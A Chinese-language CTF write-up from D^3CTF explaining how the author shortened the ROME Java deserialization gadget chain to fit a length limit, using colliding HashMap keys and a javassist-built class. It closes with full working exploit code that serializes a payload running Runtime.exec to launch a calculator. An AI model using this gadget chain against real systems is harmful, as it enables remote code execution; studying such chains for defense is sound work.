@Y4tacker
ROME改造计划
成果
从ysoserial原本的4000+缩短到1320（Base64+弹计算器）
写在前⾯
 ⾸先⾮常感谢这次的D^3CTF给我⼀次学习的机会，两个Java题都挺有意思学到了不同的东
西，因为第⼆个⽐较简单就不分享了，这⾥分享⼀下如何去缩短ROME利⽤链，本⾝我也是
之前没学习过ROME，这⾥以⼀个旁观者的视⾓来讲述好累，全篇没有各种⾼级技术不涉及
ASM 的改造，仅仅只是⼀些Trick和利⽤链的精简，同时⾮常感谢我的同学@HolaAs以及我的
朋友@风潇在我做题过程当中给我的帮助
简单分析
⾸先看看路由，很简单要求传⼊字符长度不超过1956
接下来免不了找依赖后⾯发现了ROME可以⽤，在ysoserial⾥⾯直接⾷⽤，可以惊讶的看到这
⾥只有短短的4400那么“短”，痛！太痛了！
哎呀怎么办呢？既然要改造免不了需要先看看调⽤链
/**
 *
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap.hash(Object)
 * HashMap.readObject(ObjectInputStream)
 *
 *
 */
既然要改造我的思路是，先精简利⽤链，再减少细节
看到这⾥我能有个想法就是从调⽤readObject到tostring都能尝试类替换，最下层的个⼈感觉似
乎没啥必要了，那直接再往上啰？
简单了解
很明显，既然要尝试去改造⼀条链⼦，那第⼀步就要去深⼊了解他！
这⾥就省去介绍 ObjectBean 、 ToStringBean 等类了百度都有，不做搬运⼯
先做个简单总结
1. HashMap->readObject 触发 ObjectBean->hashCode
2. 触发ObjectBean 内封装的 ObjectBean -> toString ⽅法，之后就可以触发利⽤链
也简单看看图啰
EqualsBean触发toString
紧接
着 com.sun.syndication.feed.impl.ToStringBean#toString(java.lang.String)
会调⽤所有 getter ⽅法，多提⼀嘴其实 BeanIntrospector.getPropertyDescriptors 会
获取所有getter/setter，但是下⾯有参数长度0那按照正常⼈代码就只剩getter了
因此最终通过触发getOutputProperties实现字节码加载
通常ysoserial更细节，会多很多细节，可能会更短，但不影响，这⾥我们简单按照逻辑写⼀下
代码，加深理解
果然不出我所料更长了！
但这⾥主要是学习思路
改造
失败滴改造尝试
可以很明显的看到在这⾥有个触发toString的过程，那么很容易就能想到之前通过
BadAttributeValueExpException 去触发 toString 这件事，构造完后看看，哦寄了！属
于是帮倒忙第⼀名了，拜拜再见不联系了嘞！
成功滴改造尝试
Step1--改造利⽤链  
在之前的过程当中有个地⽅⾮常吸引
我， com.sun.syndication.feed.impl.EqualsBean#equals ⽅法
可以看到 equals 最终调⽤ beanEquals 这不就和
com.sun.syndication.feed.impl.ToStringBean#toString 很像么，但是如何能触发
equals ⽅法呢
借⽤p⽜的⼀句话，但是jdk7u21的场景不适合我们这⾥，原因请看p⽜知识星球（打波⼴告p⽜
看到请给钱）
调⽤equals的场景就是集合set。set中储存的对象不允许重复，所以在添加对象的时候，
势必会涉及到⽐较操作
但是这个很明显并不适合我们这个场景（两个相同对象hashCode都⼀样了就不可能成功了，
不多说⾃⼰想）
那还有啥利⽤么，当然有的，⽐如HashMap对key也有这个神奇的机制，
为了解决这个问题，我们抽丝剥茧慢慢来啰，下⾯的只是对后⾯做铺垫
先来个简单的场景，⾸先看下⾯这个代码
会觉得他们相同吗，答案很显然
为什么呢，可以看到，由于我们value为空其实就是⽐较key的hashCode了
对于⼀个String类型其hashCode，考虑两个元素的场景也就
是 31*val[0]+val[1]=31val[0]+val[1] ，因此第⼀个元素如果⽐第⼆个元素⼩1，第⼆
个元素就必须⽐第⼀个元素⼤31
HashMap objectObjectHashMap = new HashMap<>();
HashMap objectObjectHashMap1 = new HashMap<>();
objectObjectHashMap.put("aa","");
objectObjectHashMap1.put("bB","");
System.out.println(objectObjectHashMap.hashCode());
System.out.println(objectObjectHashMap1.hashCode());
public final int hashCode() {
    return Objects.hashCode(key) ^ Objects.hashCode(value);
}
现在场景提升
仍然相等，对于这个场景⾥⾯有两个元素，它会调⽤⽗类的
java.util.AbstractMap#hashCode
为了简化理解可以把上⾯的场景代码简化为(毕竟 aa 与 bB 相等)，这样看是不是就很好理解
了
objectObjectHashMap.put("aa","1");
objectObjectHashMap.put("bB","2");
objectObjectHashMap1.put("aa","2");
objectObjectHashMap1.put("bB","1");
public int hashCode() {
  int h = 0;
  Iterator> i = entrySet().iterator();
  while (i.hasNext())
    h += i.next().hashCode();
  return h;
}
有了这个基础，再次回到我们构造ROME的过程当中
现在我们已经知道了 java.util.HashMap#putVal 在key的hashCode⼀致的时候会触发
equals⽅法调⽤，但是此刻我们的代码的key是String类型调⽤了也没⽤啊，这⾥很巧的是在
HashMap的equals⽅法当中,当对象⼤于1时会转⽽调⽤⽗
类 java.util.AbstractMap#equals ,可以很明显看到这⾥调⽤了 value.equals ，同时这
⾥我们需要将 equals 的传参数改为 TemplatesImpl 对象
那如何搞定呢，那就是把两个map的value颠倒⼀下具体为什么⾃⼰想想很简单
("aa"=>bean.quals("aa"=>templates))这⾥ => 表⽰对应
objectObjectHashMap.put("aa","1");
objectObjectHashMap.put("aa","2");
objectObjectHashMap1.put("aa","2");
objectObjectHashMap1.put("aa","1");
因此安这个思路我们可以得到
痛！太痛了！不过还是缩了⼀千多了？
仔细⼀想罪魁祸⾸就是 Gadgets.createTemplatesImpl(command);
Step2--超级⼩Trick  
map1.put("aa",templates);
map1.put("bB",bean);
map2.put("aa",bean);
map2.put("bB",templates);
那我们来看看这个ysoserial⽣成的类是啥样⼦
这⾥很多东西我们都可以改，啥 serialVersionUID 、 Pwner311912468728708 、等等这
些都可以拿下
但是你以为这样就ok了，给⼤家看个骚的
没有 trycatch ，没有实现抽象类的⽅法，这怎么实现的！！！
我们平时javac编译的时候，同样的代码都会报错
那上⾯这个咋搞的嘞，⽽且不报错，那就是javassist啰，不⽤ASM去操作好极了
现在再看看长度嘞， 1324 ⼩草莓坏笑
测试下嘞ok计算器来了，记得url编码⼀下哦！
最终代码
Rome.java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.HashMap;
import static sec.payload.Payload.setFieldValue;
public class Rome {
  public static void main(String[] args) throws Exception {
    TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl();
GetTemplatesImpl.java
    EqualsBean bean = new EqualsBean(String.class,"");
    HashMap map1 = new HashMap();
    HashMap map2 = new HashMap();
    map1.put("aa",templates);
    map1.put("bB",bean);
    map2.put("aa",bean);
    map2.put("bB",templates);
    HashMap map = new HashMap();
    map.put(map1,"");
    map.put(map2,"");
    setFieldValue(bean,"_beanClass",Templates.class);
    setFieldValue(bean,"_obj",templates);
    ByteArrayOutputStream byteArrayOutputStream = new 
ByteArrayOutputStream();
    ObjectOutputStream objectOutputStream = new 
ObjectOutputStream(byteArrayOutputStream);
    objectOutputStream.writeObject(map);
    System.out.println(new 
String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
    System.out.println(new 
String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).le
ngth());
  }
}
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.lang.reflect.Field;
public class GetTemplatesImpl {
    public static TemplatesImpl getTemplatesImpl() throws Exception{
GenerateEvilByJavaassist.java
        byte[][] bytes = new byte[][]
{GenerateEvilByJavaassist.generate()};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", bytes);
        setValue(templates, "_name", "1");
        setValue(templates, "_tfactory", null);
        return  templates;
    }
    public static void setValue(Object obj, String name, Object value) 
throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
public class GenerateEvilByJavaassist {
    public static byte[] generate() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, 
clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"open -na 
Calculator\");");
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }
}